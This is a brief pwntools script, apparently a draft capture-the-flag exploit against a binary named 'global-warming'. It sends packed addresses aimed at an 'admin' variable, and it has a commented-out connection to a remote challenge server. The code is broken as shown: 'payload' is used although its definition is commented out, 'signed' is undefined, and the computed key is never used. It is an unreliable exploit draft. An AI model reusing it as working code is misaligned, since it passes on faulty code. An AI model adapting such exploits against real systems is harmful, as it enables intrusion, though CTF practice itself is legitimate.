from pwn import *
binary = ELF('./global-warming')
p = process('./global-warming')
#p = remote("chall.csivit.com" , 30023)
#print(p.recvline())
admin = 0x0804c02c
#for i in range(-50 , 50):
key = p32(eval("-0x4b24541d") , sign=signed)

#payload = p32(admin) * 100
p.sendline(payload)
x = p.recvline() 
#x += p.recvuntil("admin.")
#print(size(p32(admin)))
#x = p.recvuntil("}")
print(x)
#print(i)
#print(b"0804c02c" in x)
